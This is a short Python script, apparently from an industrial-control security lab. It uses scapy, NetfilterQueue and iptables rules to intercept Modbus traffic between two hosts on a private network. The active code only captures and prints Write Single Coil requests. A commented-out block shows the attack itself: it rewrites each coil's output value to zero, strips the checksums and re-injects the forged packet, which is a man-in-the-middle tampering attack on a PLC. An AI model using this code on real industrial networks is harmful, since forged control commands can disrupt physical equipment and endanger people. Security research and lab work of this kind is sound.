from scapy.all import *
from scapy.contrib.modbus import *
from netfilterqueue import NetfilterQueue
import time
import argparse

def packet_callback(packet):
    payload = packet.get_payload()
    scapy_packet = IP(payload)
    scapy_datagram = TCP(payload)
    
    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(IP):
        if scapy_packet[IP].src == '10.0.0.192' and scapy_packet[IP].dst == '10.0.0.21':
            if ModbusPDU05WriteSingleCoilRequest in scapy_packet:
                print(scapy_packet[ModbusPDU05WriteSingleCoilRequest].show())
    #print(scapy_packet[IP].src + " " + scapy_packet[IP].dst)

    #if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(IP):
        #if scapy_packet[IP].src == '10.0.1.192' and scapy_packet[IP].dst == '10.0.0.21':
            #print("qualcosa")
        """
            if ModbusPDU05WriteSingleCoilRequest in scapy_packet:
                if scapy_packet[ModbusPDU05WriteSingleCoilRequest].outputAddr == 0:
                    scapy_packet[ModbusPDU05WriteSingleCoilRequest].outputValue = 0
                if scapy_packet[ModbusPDU05WriteSingleCoilRequest].outputAddr == 0:
                    scapy_packet[ModbusPDU05WriteSingleCoilRequest].show()

                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum

                packet.set_payload(bytes(scapy_packet))
        """
    
    
    packet.accept()

iptablesr1 = "iptables -I FORWARD -j NFQUEUE --queue-num 1"
iptablesr2 = "iptables -A OUTPUT -j NFQUEUE --queue-num 1"
os.system(iptablesr1)
os.system(iptablesr2)

# Create a NetfilterQueue object
nfqueue = NetfilterQueue()
nfqueue.bind(1, packet_callback)

try:
    print("Waiting for Modbus packets...")
    nfqueue.run()
except KeyboardInterrupt:
    print("[-] Exiting...")
    print("Iptables rules deleted!")    #Delete iptables rules when pressing Ctrl + C
finally:
    nfqueue.unbind()
    os.system('iptables -D FORWARD -j NFQUEUE --queue-num 1')
    os.system('iptables -D OUTPUT -j NFQUEUE --queue-num 1')